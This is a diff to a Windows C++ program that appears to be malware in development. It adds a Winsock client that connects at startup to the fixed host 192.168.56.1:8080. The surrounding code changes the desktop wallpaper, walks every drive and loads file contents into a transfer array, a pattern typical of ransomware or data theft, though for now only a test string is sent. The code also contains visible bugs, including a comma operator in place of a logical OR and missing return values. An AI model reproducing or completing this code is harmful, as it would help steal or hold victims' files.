@@ -1,3 +1,6 @@
+#pragma comment (lib, "Ws2_32.lib")
+
+#include <ws2tcpip.h> 
 #include <windows.h>
 #include <bitset>
 #include <vector>
@@ -12,9 +15,124 @@
 #include <iostream>
 #include <clocale>
 #include <stdio.h>
+#include <socketapi.h>
+#include <sys/types.h>
 
+
+#define PORT "8080"
+#define DEFAULT_BUFLEN 512
 using namespace std;
 
+class ClIENT_SOCKET
+{
+private:
+    std::string port;
+    int res;
+    SOCKET connect_socket;
+public:
+    ClIENT_SOCKET(const char* port_numb);
+    int client_start();
+    int client_recv();
+    int send_data();
+};
+
+ClIENT_SOCKET::ClIENT_SOCKET(const char* port_numb)
+{
+    port = port_numb;
+    WSADATA wsadata;
+    res = WSAStartup(MAKEWORD(2, 2), &wsadata);
+    if (res != 0) {
+        printf("WSAStartup failed: %d\n", res);
+        return;
+    }
+}
+int ClIENT_SOCKET::client_start()
+{
+    struct addrinfo* result = NULL,
+        * ptr = NULL,
+        hints;
+
+    ZeroMemory(&hints, sizeof(hints));
+    hints.ai_family = AF_INET;
+    hints.ai_socktype = SOCK_STREAM;
+    hints.ai_protocol = IPPROTO_TCP;
+    res = getaddrinfo("192.168.56.1", port.c_str(), &hints, &result);
+    if (res != 0) {
+        printf("getaddrinfo failed: %d\n", res);
+        WSACleanup();
+        return 1;
+    }
+    connect_socket = INVALID_SOCKET;
+    ptr = result;
+
+    // Create a SOCKET for connecting to server
+    connect_socket= socket(ptr->ai_family, ptr->ai_socktype,
+        ptr->ai_protocol);
+    if (connect_socket == INVALID_SOCKET) {
+        printf("Error at socket(): %ld\n", WSAGetLastError());
+        freeaddrinfo(result);
+        WSACleanup();
+        return 1;
+    }
+
+    // Connect to server.
+    res = connect(connect_socket, ptr->ai_addr, (int)ptr->ai_addrlen);
+    if (res == SOCKET_ERROR) {
+        closesocket(connect_socket);
+        connect_socket = INVALID_SOCKET;
+    }
+
+    // Should really try the next address returned by getaddrinfo
+    // if the connect call failed
+    // But for this simple example we just free the resources
+    // returned by getaddrinfo and print an error message
+
+    freeaddrinfo(result);
+
+    if (connect_socket == INVALID_SOCKET) {
+        printf("Unable to connect to server!\n");
+        WSACleanup();
+        return 1;
+    }
+}
+int ClIENT_SOCKET::send_data()
+{
+    int recvbuflen = DEFAULT_BUFLEN;
+
+    const char* sendbuf = "this is a test";
+    char recvbuf[DEFAULT_BUFLEN];
+    // Send an initial buffer
+    res = send(connect_socket, sendbuf, (int)strlen(sendbuf), 0);
+    if (res == SOCKET_ERROR) {
+        printf("send failed: %d\n", WSAGetLastError());
+        closesocket(connect_socket);
+        WSACleanup();
+        return 1;
+    }
+    printf("Bytes Sent: %ld\n", res);
+
+    // shutdown the connection for sending since no more data will be sent
+    // the client can still use the ConnectSocket for receiving data
+    res = shutdown(connect_socket, SD_SEND);
+    if (res == SOCKET_ERROR) {
+        printf("shutdown failed: %d\n", WSAGetLastError());
+        closesocket(connect_socket);
+        WSACleanup();
+        return 1;
+    }
+    // Receive data until the server closes the connection
+    do {
+        res = recv(connect_socket, recvbuf, recvbuflen, 0);
+        if (res > 0) {
+            printf("Bytes received: %d\n", res);
+            connect_socket = SOCKET_ERROR;
+        }
+        else if (res == 0)
+            printf("Connection closed\n");
+        else
+            printf("recv failed: %d\n", WSAGetLastError());
+    } while (res > 0 && connect_socket != SOCKET_ERROR);
+}
 
 class File 
 {
@@ -33,24 +151,24 @@ public:
         path.back() = ' ';
 
         std::string fn = name;
-        if (fn.substr(fn.find_last_of(".") + 1) == "bin" || fn.substr(fn.find_last_of(".") + 1) == "mp4") {
+        if (fn.substr(fn.find_last_of(".") + 1) == "bin" || fn.substr(fn.find_last_of(".") + 1) == "mp4", fn.substr(fn.find_last_of(".") + 1) == ".lock") {
             return;
         }
+        ifstream ifs(path.c_str(), ios::in | ios::binary | ios::ate);
 
-        std::ifstream file(path, std::ios::binary);
-        std::string line;
-        std::ostringstream ss;
+        ifstream::pos_type fileSize = ifs.tellg();
+        if (fileSize == 0)
+            return;
 
-        ss << file.rdbuf();
-        data = ss.str();
-        data;
-    }
+            ifs.seekg(0, ios::beg);
+
+        vector<char> bytes(fileSize);
+        ifs.read(&bytes[0], fileSize);
        
-    std::string get_data()
-    {
-        return data;
-    }
 
+        data = data + string(&bytes[0], fileSize);
+
+    }
     void set_path(std::string path_)
     {
         path = path_;
@@ -416,6 +534,9 @@ bool FIND_PRIMARY_DRIVE(const char* test_path, const char* drive_name)
         {
             std::cout << "OPENING FILE: "  << file_transfer_array[i].get_name() << std::endl;
             file_transfer_array[i].open_file();
+
+            file_transfer_array[i].get_name();
+            
            
         }
         file_transfer_array;
@@ -425,6 +546,11 @@ bool FIND_PRIMARY_DRIVE(const char* test_path, const char* drive_name)
 
 int main(int argc, char* argv[])
 {
+    ClIENT_SOCKET client_socket(PORT);
+    client_socket.client_start();
+    client_socket.send_data();
+
+
     unseen_dirs.reserve(1400000);
     change_desktop_wallpaper(argv);
     DWORD test = GetLogicalDriveStrings(drives, (LPWSTR)Buffer);
@@ -454,10 +580,10 @@ int main(int argc, char* argv[])
         case DRIVE_FIXED: 
         {
             std::string test_path = current_drive + "ProgramData\\Microsoft\\Windows";
-            if (FIND_PRIMARY_DRIVE(test_path.c_str(), drive_names[i].c_str()))
-            {
-                cout << current_drive << " :is a primary drive " << endl;
-            }; break;
+          //  if (FIND_PRIMARY_DRIVE(test_path.c_str(), drive_names[i].c_str()))
+            //{
+              //  cout << current_drive << " :is a primary drive " << endl;
+           // }; break;
         }
         case DRIVE_REMOVABLE: cout << "removable" << endl; break;
         case DRIVE_CDROM: cout << "ROM" << endl; break;
